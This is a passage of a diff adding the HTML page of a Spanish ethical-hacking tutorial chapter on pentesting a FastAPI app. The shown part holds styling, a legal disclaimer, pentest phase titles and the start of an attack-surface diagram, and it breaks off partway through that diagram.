@@ -1,0 +1,1335 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CIPHER — Cap. 04: Ethical Hacking</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Bebas+Neue&family=Crimson+Pro:ital,wght@0,300;0,400;1,300&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --black: #050507;
+    --red: #ff3f3f;
+    --red-dim: rgba(255,63,63,0.08);
+    --green: #00ff9d;
+    --amber: #ffb347;
+    --purple: #b57bff;
+    --blue: #4fc3f7;
+    --white: #e8e6df;
+    --gray: #4a4a5a;
+    --mono: 'Share Tech Mono', monospace;
+    --display: 'Bebas Neue', sans-serif;
+    --body: 'Crimson Pro', Georgia, serif;
+  }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{background:var(--black);color:var(--white);font-family:var(--body);font-weight:300;line-height:1.7;overflow-x:hidden}
+  body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,63,63,0.008) 2px,rgba(255,63,63,0.008) 4px);pointer-events:none;z-index:9999}
+
+  /* NAV */
+  nav{position:fixed;top:0;left:0;right:0;z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:1.2rem 3rem;background:linear-gradient(to bottom,rgba(5,5,7,0.98),transparent);border-bottom:1px solid rgba(255,63,63,0.07)}
+  .nav-logo{font-family:var(--display);font-size:1.8rem;letter-spacing:0.3em;color:var(--red);text-decoration:none}
+  .nav-logo span{color:var(--white)}
+  .nav-links{display:flex;gap:2rem;list-style:none}
+  .nav-links a{font-family:var(--mono);font-size:0.68rem;color:var(--gray);text-decoration:none;letter-spacing:0.15em;text-transform:uppercase;transition:color 0.2s}
+  .nav-links a:hover{color:var(--red)}
+  .nav-prev{font-family:var(--mono);font-size:0.65rem;color:var(--gray);text-decoration:none;transition:color 0.2s}
+  .nav-prev:hover{color:var(--white)}
+
+  /* HERO */
+  .hero{min-height:100vh;display:flex;flex-direction:column;justify-content:flex-end;padding:8rem 3rem 5rem;position:relative;overflow:hidden}
+  #hero-canvas{position:absolute;inset:0;z-index:0}
+  .hero-vignette{position:absolute;inset:0;z-index:1;background:radial-gradient(ellipse 80% 80% at 50% 50%,transparent 20%,rgba(5,5,7,0.7) 100%);pointer-events:none}
+  .hero-bottom-fade{position:absolute;bottom:0;left:0;right:0;height:60%;z-index:2;background:linear-gradient(to top,var(--black) 40%,transparent)}
+  .hero-content{position:relative;z-index:3}
+  .chapter-tag{font-family:var(--mono);font-size:0.65rem;color:var(--red);letter-spacing:0.3em;text-transform:uppercase;margin-bottom:1.5rem;display:flex;align-items:center;gap:1rem}
+  .chapter-tag::after{content:'';flex:0 0 40px;height:1px;background:var(--red)}
+  .hero h1{font-family:var(--display);font-size:clamp(4rem,11vw,11rem);line-height:0.88;letter-spacing:0.02em;color:var(--white)}
+  .hero h1 .accent{color:var(--red)}
+  .hero h1 .ghost{color:rgba(255,63,63,0.12)}
+  .hero-row{display:grid;grid-template-columns:1fr 1fr;gap:4rem;margin-top:3rem;padding-top:2rem;border-top:1px solid rgba(255,255,255,0.05)}
+  .hero-desc{font-size:1.1rem;color:rgba(232,230,223,0.5);line-height:1.85;font-style:italic}
+  .hero-warning{background:rgba(255,63,63,0.04);border:1px solid rgba(255,63,63,0.2);padding:1.5rem;font-family:var(--mono);font-size:0.7rem;line-height:1.8;color:var(--gray)}
+  .hero-warning strong{color:var(--red)}
+
+  /* SHARED */
+  .section{padding:8rem 3rem;position:relative}
+  .section-inner{max-width:1100px;margin:0 auto}
+  .sec-label{font-family:var(--mono);font-size:0.6rem;color:var(--red);letter-spacing:0.35em;text-transform:uppercase;margin-bottom:1rem}
+  .sec-h2{font-family:var(--display);font-size:clamp(2.5rem,5vw,5rem);letter-spacing:0.04em;line-height:1.05;color:var(--white)}
+  .sec-h2 em{font-style:normal;color:var(--red)}
+  .sec-sub{font-size:1.05rem;color:rgba(232,230,223,0.4);font-style:italic;margin-top:0.8rem;max-width:620px}
+  .fade-in{opacity:0;transform:translateY(16px);transition:opacity 0.6s,transform 0.6s}
+  .fade-in.visible{opacity:1;transform:translateY(0)}
+
+  /* ── PENTESTING PHASES ── */
+  .phases-wrap{margin-top:4rem;position:relative}
+  .phases-track{display:flex;gap:0;overflow-x:auto;padding-bottom:1rem;scrollbar-width:thin;scrollbar-color:var(--red) transparent}
+  .phase-card{min-width:200px;flex:1;border:1px solid rgba(255,63,63,0.1);position:relative;cursor:pointer;transition:border-color 0.3s,background 0.3s;background:rgba(255,63,63,0.01)}
+  .phase-card:hover,.phase-card.active{border-color:rgba(255,63,63,0.35);background:rgba(255,63,63,0.04)}
+  .phase-card::after{content:'→';position:absolute;right:-1px;top:50%;transform:translateY(-50%);font-family:var(--mono);font-size:0.8rem;color:var(--red);z-index:2;background:var(--black);padding:0 4px}
+  .phase-card:last-child::after{display:none}
+  .phase-num{font-family:var(--display);font-size:3.5rem;color:rgba(255,63,63,0.08);line-height:1;padding:1.5rem 1.5rem 0}
+  .phase-name{font-family:var(--mono);font-size:0.75rem;color:var(--red);letter-spacing:0.12em;text-transform:uppercase;padding:0 1.5rem}
+  .phase-subtitle{font-family:var(--body);font-size:0.9rem;color:rgba(232,230,223,0.4);padding:0.3rem 1.5rem 1.5rem;font-style:italic}
+  .phase-detail{margin-top:2px;border:1px solid rgba(255,63,63,0.12);border-top:none;padding:2.5rem;min-height:280px;display:none;background:rgba(255,63,63,0.015)}
+  .phase-detail.active{display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:start}
+  .phase-detail-text{font-size:1rem;color:rgba(232,230,223,0.6);line-height:1.8}
+  .phase-detail-text p+p{margin-top:0.8rem}
+  .phase-tools{display:flex;flex-direction:column;gap:0.5rem}
+  .tool-item{display:flex;align-items:center;gap:0.8rem;font-family:var(--mono);font-size:0.7rem;padding:0.6rem 0.8rem;border:1px solid rgba(255,255,255,0.05);color:rgba(232,230,223,0.6);transition:border-color 0.2s}
+  .tool-item:hover{border-color:rgba(255,63,63,0.2);color:var(--white)}
+  .tool-icon{font-size:1rem}
+  .tool-name{color:var(--red)}
+  .tool-desc{color:var(--gray);margin-left:auto;font-size:0.6rem}
+  .phase-fastapi{grid-column:1/-1;background:rgba(0,255,157,0.03);border:1px solid rgba(0,255,157,0.1);padding:1rem 1.5rem;font-family:var(--mono);font-size:0.7rem;color:var(--green);line-height:1.7}
+
+  /* ── ATTACK MAP ── */
+  .attack-map{margin-top:4rem;position:relative;width:100%;overflow:hidden}
+  .map-svg-wrap{width:100%;border:1px solid rgba(255,63,63,0.08);background:rgba(5,5,7,0.8);position:relative}
+
+  /* ── OWASP TOP 10 ── */
+  .owasp-grid{display:flex;flex-direction:column;gap:2px;margin-top:4rem}
+  .owasp-row{display:grid;grid-template-columns:60px 50px 1fr auto;align-items:center;gap:0;border:1px solid rgba(255,255,255,0.04);transition:background 0.2s,border-color 0.2s;cursor:pointer;position:relative;overflow:hidden}
+  .owasp-row:hover{background:rgba(255,63,63,0.02);border-color:rgba(255,63,63,0.12)}
+  .owasp-rank{font-family:var(--display);font-size:2rem;color:rgba(255,63,63,0.12);text-align:center;padding:1rem 0.5rem}
+  .owasp-sev-bar{width:4px;align-self:stretch}
+  .sev-crit-bar{background:var(--red)}
+  .sev-high-bar{background:var(--amber)}
+  .sev-med-bar{background:#ffe066}
+  .owasp-content{padding:1.2rem 1.5rem}
+  .owasp-name{font-family:var(--mono);font-size:0.78rem;color:var(--white);letter-spacing:0.05em}
+  .owasp-cat{font-family:var(--mono);font-size:0.58rem;color:var(--gray);letter-spacing:0.12em;text-transform:uppercase;margin-top:0.2rem}
+  .owasp-expand{padding:1rem 1.5rem;font-family:var(--mono);font-size:0.6rem;color:var(--gray);letter-spacing:0.1em;text-transform:uppercase;white-space:nowrap}
+  .owasp-detail{display:none;grid-column:1/-1;padding:1.5rem 5.5rem;border-top:1px solid rgba(255,255,255,0.04);background:rgba(255,63,63,0.02)}
+  .owasp-detail.open{display:grid;grid-template-columns:1fr 1fr;gap:2.5rem}
+  .owasp-detail-text{font-size:0.95rem;color:rgba(232,230,223,0.55);line-height:1.7}
+  .owasp-code{font-family:var(--mono);font-size:0.72rem;line-height:1.8;background:rgba(5,5,7,0.8);border:1px solid rgba(255,255,255,0.06);padding:1.2rem;overflow-x:auto}
+  .vuln-line{color:var(--red)}
+  .fix-line{color:var(--green)}
+  .neutral{color:rgba(232,230,223,0.5)}
+  .cm-code{color:var(--gray);font-style:italic}
+  .owasp-tag-crit{font-family:var(--mono);font-size:0.58rem;padding:0.15rem 0.5rem;background:rgba(255,63,63,0.08);border:1px solid rgba(255,63,63,0.2);color:var(--red);white-space:nowrap}
+  .owasp-tag-high{font-family:var(--mono);font-size:0.58rem;padding:0.15rem 0.5rem;background:rgba(255,179,71,0.08);border:1px solid rgba(255,179,71,0.2);color:var(--amber);white-space:nowrap}
+
+  /* ── KALI TOOLS ── */
+  .tools-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1.5rem;margin-top:4rem}
+  .kali-card{border:1px solid rgba(255,255,255,0.05);padding:2rem;position:relative;overflow:hidden;transition:border-color 0.3s,background 0.3s;background:rgba(255,255,255,0.01);cursor:default}
+  .kali-card:hover{border-color:rgba(255,63,63,0.2);background:rgba(255,63,63,0.02)}
+  .kali-icon{font-family:var(--display);font-size:2.5rem;color:rgba(255,63,63,0.12);position:absolute;top:1rem;right:1.5rem;line-height:1}
+  .kali-cat{font-family:var(--mono);font-size:0.55rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--gray);margin-bottom:0.5rem}
+  .kali-name{font-family:var(--mono);font-size:0.9rem;color:var(--red);margin-bottom:0.5rem;letter-spacing:0.05em}
+  .kali-desc{font-size:0.9rem;color:rgba(232,230,223,0.5);line-height:1.6}
+  .kali-cmd{margin-top:1rem;padding:0.5rem 0.8rem;background:rgba(5,5,7,0.8);border:1px solid rgba(255,255,255,0.06);font-family:var(--mono);font-size:0.65rem;color:var(--green)}
+  .kali-status{position:absolute;bottom:1rem;right:1.5rem;font-family:var(--mono);font-size:0.55rem;padding:0.15rem 0.5rem;letter-spacing:0.1em;border:1px solid}
+  .status-legal{color:var(--green);border-color:rgba(0,255,157,0.2)}
+  .status-careful{color:var(--amber);border-color:rgba(255,179,71,0.2)}
+
+  /* ── TERMINAL ATTACK SIM ── */
+  .terminal-section{padding:6rem 3rem;background:linear-gradient(to bottom,transparent,rgba(255,63,63,0.01),transparent)}
+  .terminal-tabs{display:flex;gap:0;border-bottom:1px solid rgba(255,255,255,0.06);margin-bottom:0;max-width:900px;margin-left:auto;margin-right:auto}
+  .t-tab{font-family:var(--mono);font-size:0.65rem;letter-spacing:0.1em;text-transform:uppercase;padding:0.7rem 1.5rem;color:var(--gray);cursor:pointer;border-bottom:2px solid transparent;transition:color 0.2s,border-color 0.2s}
+  .t-tab.active{color:var(--red);border-bottom-color:var(--red)}
+  .t-pane{display:none;max-width:900px;margin:0 auto}
+  .t-pane.active{display:block}
+  .term-win{background:rgba(5,5,7,0.95);border:1px solid rgba(255,63,63,0.15);border-top:none;box-shadow:0 0 60px rgba(255,63,63,0.04)}
+  .term-head{background:rgba(255,63,63,0.04);border-bottom:1px solid rgba(255,63,63,0.08);padding:0.7rem 1.2rem;display:flex;align-items:center;gap:0.6rem}
+  .tdot{width:10px;height:10px;border-radius:50%}
+  .tdot.r{background:#ff5f57}.tdot.y{background:#febc2e}.tdot.g{background:#28c840}
+  .ttitle{font-family:var(--mono);font-size:0.62rem;color:var(--gray);letter-spacing:0.1em;margin-left:0.5rem}
+  .term-body{padding:1.8rem 2rem;font-family:var(--mono);font-size:0.78rem;line-height:2;overflow-x:auto}
+  .tp{color:var(--green)}.tc{color:var(--white)}.tout{color:rgba(232,230,223,0.5)}.thigh{color:var(--amber)}.tred{color:var(--red)}.tdim{color:var(--gray)}.tcursor{display:inline-block;width:8px;height:1.1em;background:var(--red);animation:blink 1s step-end infinite;vertical-align:text-bottom;margin-left:2px}
+
+  /* ── LIVE VULN DEMO ── */
+  .demo-section{padding:8rem 3rem}
+  .demo-grid{display:grid;grid-template-columns:1fr 1fr;gap:3rem;margin-top:4rem}
+  .demo-panel{border:1px solid rgba(255,255,255,0.06);overflow:hidden}
+  .demo-head{padding:0.8rem 1.2rem;display:flex;align-items:center;gap:0.8rem;border-bottom:1px solid rgba(255,255,255,0.05);font-family:var(--mono);font-size:0.62rem;color:var(--gray);letter-spacing:0.12em;text-transform:uppercase;background:rgba(255,255,255,0.02)}
+  .demo-badge-vuln{padding:0.15rem 0.5rem;font-size:0.55rem;background:rgba(255,63,63,0.1);border:1px solid rgba(255,63,63,0.25);color:var(--red)}
+  .demo-badge-fix{padding:0.15rem 0.5rem;font-size:0.55rem;background:rgba(0,255,157,0.08);border:1px solid rgba(0,255,157,0.2);color:var(--green)}
+  .demo-body{padding:1.5rem;font-family:var(--mono);font-size:0.75rem;line-height:1.9}
+  .demo-input-wrap{padding:1.5rem;border-top:1px solid rgba(255,255,255,0.05)}
+  .demo-label-small{font-family:var(--mono);font-size:0.58rem;color:var(--gray);letter-spacing:0.15em;text-transform:uppercase;display:block;margin-bottom:0.4rem}
+  .demo-inp{width:100%;background:transparent;border:1px solid rgba(255,63,63,0.2);color:var(--white);font-family:var(--mono);font-size:0.85rem;padding:0.6rem 0.8rem;outline:none;transition:border-color 0.2s}
+  .demo-inp:focus{border-color:rgba(255,63,63,0.5)}
+  .demo-inp.safe{border-color:rgba(0,255,157,0.2)}
+  .demo-inp.safe:focus{border-color:rgba(0,255,157,0.5)}
+  .demo-result{margin-top:1rem;padding:0.8rem 1rem;font-family:var(--mono);font-size:0.72rem;min-height:2.5rem;line-height:1.6;border:1px solid rgba(255,255,255,0.06)}
+  .demo-result.danger{color:var(--red);border-color:rgba(255,63,63,0.2);background:rgba(255,63,63,0.04)}
+  .demo-result.safe-result{color:var(--green);border-color:rgba(0,255,157,0.15);background:rgba(0,255,157,0.03)}
+
+  /* ── CTF SECTION ── */
+  .ctf-section{padding:8rem 3rem;background:linear-gradient(to bottom,transparent,rgba(255,63,63,0.01),transparent)}
+  .ctf-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:rgba(255,63,63,0.08);margin-top:4rem}
+  .ctf-card{background:var(--black);padding:2rem;transition:background 0.3s}
+  .ctf-card:hover{background:rgba(255,63,63,0.02)}
+  .ctf-category{font-family:var(--mono);font-size:0.6rem;color:var(--red);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.8rem}
+  .ctf-card h3{font-family:var(--display);font-size:1.8rem;letter-spacing:0.05em;color:var(--white);margin-bottom:0.5rem;line-height:1.1}
+  .ctf-card p{font-size:0.9rem;color:rgba(232,230,223,0.5);line-height:1.6}
+  .ctf-platforms{margin-top:1rem;display:flex;flex-wrap:wrap;gap:0.4rem}
+  .ctf-pill{font-family:var(--mono);font-size:0.6rem;padding:0.2rem 0.6rem;border:1px solid rgba(255,63,63,0.2);color:var(--red)}
+  .ctf-pill.beginner{border-color:rgba(0,255,157,0.2);color:var(--green)}
+  .ctf-pill.mid{border-color:rgba(255,179,71,0.2);color:var(--amber)}
+  .ctf-pill.hard{border-color:rgba(255,63,63,0.3);color:var(--red)}
+
+  /* ── METHODOLOGY RADAR ── */
+  .radar-wrap{margin-top:4rem;display:flex;flex-direction:column;align-items:center;gap:2rem}
+
+  /* ── CODE SECTION ── */
+  .code-section{padding:6rem 3rem}
+  .code-tabs{display:flex;gap:0;margin-top:4rem;border-bottom:1px solid rgba(255,255,255,0.06)}
+  .code-tab{font-family:var(--mono);font-size:0.65rem;letter-spacing:0.1em;text-transform:uppercase;padding:0.7rem 1.5rem;color:var(--gray);cursor:pointer;border-bottom:2px solid transparent;transition:color 0.2s,border-color 0.2s}
+  .code-tab.active{color:var(--red);border-bottom-color:var(--red)}
+  .code-pane{display:none}
+  .code-pane.active{display:block}
+  .code-block{background:rgba(5,5,7,0.95);border:1px solid rgba(255,255,255,0.06);border-top:none;padding:2rem;font-family:var(--mono);font-size:0.78rem;line-height:1.9;overflow-x:auto}
+  .kw{color:#c792ea}.fn{color:var(--amber)}.str{color:var(--green)}.cm{color:var(--gray);font-style:italic}.dec{color:var(--blue)}.cls{color:#82aaff}.num{color:var(--red)}.op{color:rgba(232,230,223,0.4)}.vl{color:var(--red)}.gd{color:var(--green)}
+
+  /* ── MINDSET SECTION ── */
+  .mindset-section{padding:8rem 3rem}
+  .mindset-quote{max-width:700px;margin:4rem auto 0;text-align:center;position:relative}
+  .mindset-quote blockquote{font-family:var(--body);font-size:1.6rem;font-style:italic;color:rgba(232,230,223,0.6);line-height:1.65;position:relative}
+  .mindset-quote blockquote::before{content:'"';font-family:var(--display);font-size:8rem;color:rgba(255,63,63,0.06);position:absolute;top:-2rem;left:-2rem;line-height:1}
+  .mindset-quote cite{font-family:var(--mono);font-size:0.65rem;color:var(--gray);letter-spacing:0.15em;text-transform:uppercase;margin-top:1.5rem;display:block}
+  .mindset-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:2px;background:rgba(255,255,255,0.04);margin-top:5rem}
+  .mindset-card{background:var(--black);padding:2.5rem}
+  .mindset-num{font-family:var(--display);font-size:4rem;color:rgba(255,63,63,0.06);line-height:1;margin-bottom:0.5rem}
+  .mindset-card h3{font-family:var(--mono);font-size:0.75rem;color:var(--white);letter-spacing:0.12em;text-transform:uppercase;margin-bottom:0.8rem}
+  .mindset-card p{font-size:1rem;color:rgba(232,230,223,0.5);line-height:1.7}
+
+  /* LOG */
+  .log-section{padding:5rem 3rem;border-top:1px solid rgba(255,255,255,0.04)}
+  .log-entry{max-width:800px;margin:3rem auto 0;background:rgba(255,63,63,0.02);border:1px solid rgba(255,63,63,0.1);padding:3rem;position:relative}
+  .log-entry::before{content:'ENTRADA DE APRENDIZAJE // CAPÍTULO 04';font-family:var(--mono);font-size:0.55rem;color:var(--red);letter-spacing:0.25em;position:absolute;top:-0.5rem;left:2rem;background:var(--black);padding:0 0.8rem}
+  .log-date{font-family:var(--mono);font-size:0.65rem;color:var(--gray);margin-bottom:1.5rem}
+  .log-entry p{font-size:1.05rem;color:rgba(232,230,223,0.65);line-height:1.85;font-style:italic}
+  .log-entry p+p{margin-top:1rem}
+
+  /* FOOTER */
+  footer{padding:4rem 3rem;border-top:1px solid rgba(255,255,255,0.04);display:flex;justify-content:space-between;align-items:center}
+  .footer-brand{font-family:var(--display);font-size:1.5rem;letter-spacing:0.3em;color:rgba(255,63,63,0.3)}
+  .chapter-nav{display:flex;gap:3rem}
+  .ch-link{display:flex;flex-direction:column;gap:0.3rem;text-decoration:none}
+  .ch-label{font-family:var(--mono);font-size:0.6rem;color:var(--gray);letter-spacing:0.2em;text-transform:uppercase}
+  .ch-title{font-family:var(--display);font-size:1.1rem;letter-spacing:0.1em;color:var(--white);transition:color 0.2s}
+  .ch-link:hover .ch-title{color:var(--red)}
+  .ch-link.prev .ch-title{color:rgba(232,230,223,0.3)}
+  .footer-copy{font-family:var(--mono);font-size:0.6rem;color:var(--gray);letter-spacing:0.1em;text-align:center;padding:1.5rem 3rem;border-top:1px solid rgba(255,255,255,0.03)}
+
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+  @keyframes scanline{0%{top:-10%}100%{top:110%}}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
+  @keyframes glitch{0%,92%,100%{transform:none;opacity:0}93%{transform:translateX(-3px);opacity:0.8}95%{transform:translateX(3px);opacity:0.8}97%{transform:none;opacity:0}}
+
+  @media(max-width:900px){
+    nav{padding:1rem 1.5rem}.nav-links{display:none}
+    .section,.terminal-section,.demo-section,.ctf-section,.code-section,.mindset-section{padding:5rem 1.5rem}
+    .hero-row,.demo-grid,.owasp-detail.open,.mindset-grid{grid-template-columns:1fr}
+    .tools-grid,.ctf-cards{grid-template-columns:1fr}
+    .phase-detail.active{grid-template-columns:1fr}
+    footer{flex-direction:column;gap:2rem;align-items:flex-start}
+    .hero h1{font-size:clamp(3rem,15vw,6rem)}
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="#" class="nav-logo">CIPHER<span>DOC</span></a>
+  <ul class="nav-links">
+    <li><a href="#fases">Fases</a></li>
+    <li><a href="#owasp">OWASP</a></li>
+    <li><a href="#herramientas">Herramientas</a></li>
+    <li><a href="#ataques">Ataques en Vivo</a></li>
+    <li><a href="#ctf">CTF</a></li>
+  </ul>
+  <a href="cybersec_chapter3.html" class="nav-prev">← Cap. 03</a>
+</nav>
+
+<!-- ════ HERO ════ -->
+<section class="hero">
+  <canvas id="hero-canvas"></canvas>
+  <div class="hero-vignette"></div>
+  <div class="hero-bottom-fade"></div>
+
+  <div class="hero-content">
+    <p class="chapter-tag">Capítulo 04 — El Arte del Ataque Ético</p>
+    <h1>
+      <em class="accent">ETHICAL</em><br>
+      HACKING
+      <span class="ghost" style="display:block;font-size:0.35em;letter-spacing:0.3em">// PENTEST · RED TEAM · OWASP</span>
+    </h1>
+    <div class="hero-row">
+      <p class="hero-desc">
+        Para defender un sistema, primero tienes que pensar como quien lo ataca. El hacking ético no es ilegal ni inmoral — es necesario. Los mismos conocimientos, otra intención. Hoy aprendes a romper tu propia FastAPI antes de que alguien más lo haga.
+      </p>
+      <div class="hero-warning">
+        <strong>⚠ DISCLAIMER LEGAL</strong><br>
+        Todo lo aquí presentado es para uso en entornos propios o con permiso explícito por escrito. Atacar sistemas sin autorización es ilegal en prácticamente todos los países. El propósito es <strong>encontrar vulnerabilidades antes que los atacantes</strong>.
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════ LAS 5 FASES DEL PENTESTING ════ -->
+<section class="section" id="fases">
+  <div class="section-inner">
+    <p class="sec-label fade-in">// sección 01</p>
+    <h2 class="sec-h2 fade-in">Las <em>5 fases</em><br>del pentesting</h2>
+    <p class="sec-sub fade-in">Metodología estándar — la misma que usa un Red Team profesional. Haz click en cada fase.</p>
+
+    <div class="phases-wrap fade-in">
+      <div class="phases-track">
+        <div class="phase-card active" data-phase="0">
+          <div class="phase-num">01</div>
+          <div class="phase-name">Reconocimiento</div>
+          <div class="phase-subtitle">Información pasiva</div>
+        </div>
+        <div class="phase-card" data-phase="1">
+          <div class="phase-num">02</div>
+          <div class="phase-name">Escaneo</div>
+          <div class="phase-subtitle">Mapeo activo</div>
+        </div>
+        <div class="phase-card" data-phase="2">
+          <div class="phase-num">03</div>
+          <div class="phase-name">Explotación</div>
+          <div class="phase-subtitle">Ganar acceso</div>
+        </div>
+        <div class="phase-card" data-phase="3">
+          <div class="phase-num">04</div>
+          <div class="phase-name">Post-Explot.</div>
+          <div class="phase-subtitle">Persistencia</div>
+        </div>
+        <div class="phase-card" data-phase="4">
+          <div class="phase-num">05</div>
+          <div class="phase-name">Reporte</div>
+          <div class="phase-subtitle">Documentar todo</div>
+        </div>
+      </div>
+
+      <div id="phase-detail" class="phase-detail active">
+        <!-- contenido dinámico -->
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════ ATTACK SURFACE MAP ════ -->
+<section class="section" style="padding-top:2rem" id="superficie">
+  <div class="section-inner">
+    <p class="sec-label fade-in">// sección 02 — superficie de ataque</p>
+    <h2 class="sec-h2 fade-in">Tu FastAPI vista<br>por un <em>atacante</em></h2>
+    <p class="sec-sub fade-in">Cada componente de tu stack es un potencial punto de entrada. Conocerlos es el primer paso para defenderlos.</p>
+
+    <div class="fade-in" style="margin-top:4rem">
+      <svg viewBox="0 0 900 520" xmlns="http://www.w3.org/2000/svg" style="width:100%;border:1px solid rgba(255,63,63,0.08);background:rgba(5,5,7,0.9)">
+        <!-- grid -->
+        <defs>
+          <pattern id="grid" width="40" height="40" patternUnits="userSpaceOnUse">
+            <path d="M 40 0 L 0 0 0 40" fill="none" stroke="rgba(255,63,63,0.04)" stroke-width="0.5"/>
+          </pattern>
+          <filter id="glow">
+            <feGaussianBlur stdDeviation="3" result="blur"/>
+            <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+          </filter>
+        </defs>
+        <rect width="900" height="520" fill="url(#grid)"/>
+
+        <!-- Internet zone -->
+        <rect x="10" y="10" width="160" height="500" fill="rgba(255,63,63,0.02)" stroke="rgba(255,63,63,0.1)" stroke-width="1" stroke-dasharray="4,4"/>
+        <text x="90" y="30" text-anchor="middle" font-family="Share Tech Mono" font-size="9" fill="rgba(255,63,63,0.4)" letter-spacing="2">INTERNET</text>
+
+        <!-- DMZ zone -->
+        <rect x="180" y="10" width="200" height="500" fill="rgba(255,179,71,0.01)" stroke="rgba(255,179,71,0.08)" stroke-width="1" stroke-dasharray="4,4"/>
+        <text x="280" y="30" text-anchor="middle" font-family="Share Tech Mono" font-size="9" fill="rgba(255,179,71,0.4)" letter-spacing="2">DMZ / PROXY</text>
+
+        <!-- App zone -->
+        <rect x="390" y="10" width="220" height="500" fill="rgba(0,255,157,0.01)" stroke="rgba(0,255,157,0.07)" stroke-width="1" stroke-dasharray="4,4"/>
+        <text x="500" y="30" text-anchor="middle" font-family="Share Tech Mono" font-size="9" fill="rgba(0,255,157,0.3)" letter-spacing="2">APP LAYER</text>
+
+        <!-- DB zone -->
+        <rect x="620" y="10" width="270" height="500" fill="rgba(79,195,247,0.01)" stroke="rgba(79,195,247,0.07)" stroke-width="1" stroke-dasharray="4,4"/>
+        <text x="755" y="30" text-anchor="middle" font-family="Share Tech Mono" font-size="9" fill="rgba(79,195,247,0.3)" letter-spacing="2">DATA LAYER</text>
+
+        <!-- ATTACKER -->
+        <circle cx="80" cy="180" r="28" fill="rgba(255,63,63,0.06)" stroke="rgba(255,63,63,0.4)" stroke-width="1.5"/>
+        <text x="80" y="175" text-anchor="middle" font-family="Share Tech Mono" font-size="18" fill="rgba(255,63,63,0.7)">👾</text>
+        <text x="80" y="192" text-anchor="middle" font-family="Share Tech Mono" font-size="8" fill="rgba(255,63,63,0.5)" letter-spacing="1">ATTACKER</text>
+
+        <!-- Browser user -->
+        <circle cx="80" cy="340" r="28" fill="rgba(232,230,223,0.02)" stroke="rgba(232,230,223,0.2)" stroke-width="1"/>
+        <text x="80" y="335" text-anchor="middle" font-family="Share Tech Mono" font-size="18" fill="rgba(232,230,223,0.4)">🖥</text>
+        <text x="80" y="352" text-anchor="middle" font-family="Share Tech Mono" font-size="8" fill="rgba(232,230,223,0.3)" letter-spacing="1">USER</text>
+
+        <!-- NGINX -->
+        <rect x="200" y="120" width="140" height="60" rx="2" fill="rgba(255,179,71,0.04)" stroke="rgba(255,179,71,0.3)" stroke-width="1.5"/>
+        <text x="270" y="147" text-anchor="middle" font-family="Share Tech Mono" font-size="11" fill="rgba(255,179,71,0.9)" letter-spacing="1">NGINX</text>
+        <text x="270" y="164" text-anchor="middle" font-family="Share Tech Mono" font-size="8" fill="rgba(255,179,71,0.4)">TLS termination · :443</text>
+        <!-- vuln badge -->
+        <rect x="312" y="112" width="36" height="14" rx="1" fill="rgba(255,63,63,0.12)" stroke="rgba(255,63,63,0.3)" stroke-width="0.5"/>
+        <text x="330" y="123" text-anchor="middle" font-family="Share Tech Mono" font-size="7" fill="rgba(255,63,63,0.8)">MITM?</text>
+
+        <!-- Firewall -->
+        <rect x="200" y="280" width="140" height="60" rx="2" fill="rgba(255,179,71,0.02)" stroke="rgba(255,179,71,0.2)" stroke-width="1"/>
+        <text x="270" y="307" text-anchor="middle" font-family="Share Tech Mono" font-size="11" fill="rgba(255,179,71,0.6)" letter-spacing="1">FIREWALL</text>
+        <text x="270" y="324" text-anchor="middle" font-family="Share Tech Mono" font-size="8" fill="rgba(255,179,71,0.3)">Rate limit · IP block</text>
+
+        <!-- FastAPI -->
+        <rect x="410" y="160" width="180" height="80" rx="2" fill="rgba(0,255,157,0.04)" stroke="rgba(0,255,157,0.35)" stroke-width="2"/>
+        <text x="500" y="192" text-anchor="middle" font-family="Share Tech Mono" font-size="12" fill="rgba(0,255,157,0.9)" letter-spacing="1">FASTAPI</text>
+        <text x="500" y="210" text-anchor="middle" font-family="Share Tech Mono" font-size="8" fill="rgba(0,255,157,0.5)">Uvicorn · :8000</text>
+        <text x="500" y="228" text-anchor="middle" font-family="Share Tech Mono" font-size="7.5" fill="rgba(0,255,157,0.4)">@router · Pydantic · JWT</text>
+        <!-- attack vectors -->
+        <rect x="412" y="152" width="55" height="13" rx="1" fill="rgba(255,63,63,0.12)" stroke="rgba(255,63,63,0.3)" stroke-width="0.5"/>
+        <text x="439" y="162" text-anchor="middle" font-family="Share Tech Mono" font-size="6.5" fill="rgba(255,63,63,0.9)">SQL INJECT</text>
+        <rect x="475" y="152" width="38" height="13" rx="1" fill="rgba(255,63,63,0.12)" stroke="rgba(255,63,63,0.3)" stroke-width="0.5"/>
+        <text x="494" y="162" text-anchor="middle" font-family="Share Tech Mono" font-size="6.5" fill="rgba(255,63,63,0.9)">AUTH?</text>
+        <rect x="521" y="152" width="66" height="13" rx="1" fill="rgba(255,63,63,0.12)" stroke="rgba(255,63,63,0.3)" stroke-width="0.5"/>
+        <text x="554" y="162" text-anchor="middle" font-family="Share Tech Mono" font-size="6.5" fill="rgba(255,63,63,0.9)">BROKEN AUTHZ</text>
+
+        <!-- PostgreSQL -->
+        <rect x="650" y="160" width="160" height="70" rx="2" fill="rgba(79,195,247,0.03)" stroke="rgba(79,195,247,0.3)" stroke-width="1.5"/>
+        <text x="730" y="192" text-anchor="middle" font-family="Share Tech Mono" font-size="11" fill="rgba(79,195,247,0.8)" letter-spacing="1">PostgreSQL</text>
